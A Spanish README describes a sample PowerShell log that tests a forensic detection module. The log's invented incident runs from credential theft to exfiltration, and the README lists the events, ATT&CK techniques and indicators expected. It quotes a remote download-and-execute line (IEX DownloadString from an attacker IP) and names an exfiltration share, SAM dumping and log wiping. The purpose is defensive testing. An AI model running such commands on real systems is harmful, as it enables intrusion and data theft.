# Caso de ejemplo — SRV-FILE01

Log de muestra para probar el módulo de principio a fin sin tener que
inventarse nada: `SRV-FILE01_powershell_operational.log`.

## El caso

| | |
|---|---|
| **Caso** | Acceso no autorizado al servidor de ficheros |
| **Equipo** | SRV-FILE01 (servidor de ficheros, dominio CORP) |
| **Fecha** | 12/09/2026, entre las 02:11 y las 02:41 **hora local (UTC+02:00)** |
| **Origen del log** | Registro operativo de PowerShell exportado a texto |
| **Responsable** | el perito que analiza el caso |

La historia que cuenta el log es la de siempre: alguien entra con una cuenta
de servicio, mira dónde ha caído, se descarga su herramienta, roba
credenciales, se crea una puerta trasera, se lleva la contabilidad y borra el
rastro.

## Cómo usarlo

**Desde la aplicación**: crea un caso, abre *Tracking Post-Incidente*,
selecciona el caso, elige el fichero y pon la zona del log en **UTC+02:00**
(el log está en hora española; si lo dejas en UTC, las horas saldrán
desplazadas dos horas).

**Desde la API**:

```bash
curl -X POST "http://localhost:8001/cases/1/tracking/analyze" -H "Authorization: Bearer <token>" -F "file=@examples/SRV-FILE01_powershell_operational.log" -F "zona_horaria=+02:00"
```

## Lo que debe detectar

**19 eventos**: 6 críticos, 5 altos, 7 medios y 1 bajo. Las horas se guardan
siempre en UTC, así que las 02:11 del log aparecen como 00:11.

| Hora (UTC) | Sev. | Regla | Qué pasó |
|---|---|---|---|
| 00:11:48 | media | `acceso_a_recurso_compartido` | Se conecta al recurso con una cuenta de servicio |
| 00:14:07 | baja | — | `whoami`: la salida identifica a `CORP\svc_backup` |
| 00:15:22 | media | `autenticacion_fallida` | Suceso 4625: intento fallido contra `administrador` |
| 00:15:41 | media | `inicio_de_sesion_remoto` | Suceso 4624: entra por red |
| 00:17:09 | media | `enumeracion_de_privilegios` | Enumera las cuentas del equipo |
| 00:17:55 | media | `reconocimiento_de_red` | `netstat`: conexión establecida con 185.220.101.7 |
| 00:18:30 | media | `reconocimiento_de_red` | `net view`: dibuja el dominio |
| 00:22:18 | **crítica** | `descarga_con_binario_legitimo` | `certutil` descarga un ejecutable (LOLBin) |
| 00:23:40 | **crítica** | `powershell_ofuscado_o_descarga_remota` | PowerShell en base64 **descodificado**: `IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.7/stage2.ps1')` |
| 00:25:11 | **crítica** | `volcado_de_credenciales` | Copia la colmena SAM del registro |
| 00:27:03 | alta | `cuenta_o_grupo_modificado` | Crea la cuenta `soporte_adm` |
| 00:27:44 | alta | `cuenta_o_grupo_modificado` | La mete en Administradores |
| 00:29:10 | alta | `persistencia_registro_o_tarea` | Tarea programada como SYSTEM al iniciar sesión |
| 00:31:02 | alta | `desactivacion_de_defensas` | Apaga el cortafuegos |
| 00:33:27 | alta | `preparacion_de_exfiltracion` | Comprime la carpeta de Contabilidad |
| 00:36:12 | **crítica** | `exfiltracion_de_datos` | Copia el ZIP a un recurso remoto |
| 00:36:55 | media | `acceso_a_recurso_compartido` | Desmonta el recurso usado para sacar los datos |
| 00:41:05 | **crítica** | `borrado_evidencias_o_shadow_copies` | Borra las instantáneas |
| 00:41:38 | **crítica** | `borrado_evidencias_o_shadow_copies` | Vacía el registro de seguridad |

**33 técnicas MITRE ATT&CK** distintas, entre ellas T1003.001–003 (credenciales),
T1105 y T1197 (descarga), T1059.001 y T1027 (ejecución ofuscada), T1136.001 y
T1098 (cuentas), T1053.005 (tarea programada), T1562 (defensas), T1048 y T1567
(exfiltración) y T1490 con T1070 (destrucción de evidencia).

**Indicadores**, con las líneas en las que aparece cada uno:

| Tipo | Valor | Líneas |
|---|---|---|
| IP pública | `185.220.101.7` | 10, 15, 17, 25, 28 |
| URL | `http://185.220.101.7/upd.exe` | 15 |
| URL | `http://185.220.101.7/stage2.ps1` | 17 *(dentro del base64)* |
| Ruta | `C:\ProgramData\svchost-upd.exe` | 15, 22 |
| Ruta | `C:\ProgramData\sam.save` | 18 |
| Ruta | `\\185.220.101.7\exfil` | 25, 28 |
| IP privada | `10.14.7.21`, `10.14.7.63` | 5, 10 |

Fíjate en la IP del atacante: aparece en **cinco líneas distintas** y en tres
formas (una conexión de `netstat`, dos URLs y un recurso de red). Esa
correlación es justo lo que el módulo pone delante del perito sin que tenga
que leer el log a ojo.

## Para qué sirve además

- Comprobar que un despliegue nuevo funciona: subirlo y ver estas 19 filas.
- Ver la cadena de integridad: guárdalo, pulsa *Verificar integridad* y luego
  cambia una fila de `tracking_events` a mano; la verificación lo detecta.
- Probar la exportación a CSV y JSON con datos que se parecen a los de verdad.

Los comandos son reales, pero el incidente es inventado: ni el equipo, ni el
dominio, ni las cuentas existen, y no hay ningún dato personal. La IP del
"atacante" aparece a menudo en informes públicos de análisis; aquí es solo un
valor de relleno y no señala a nadie.
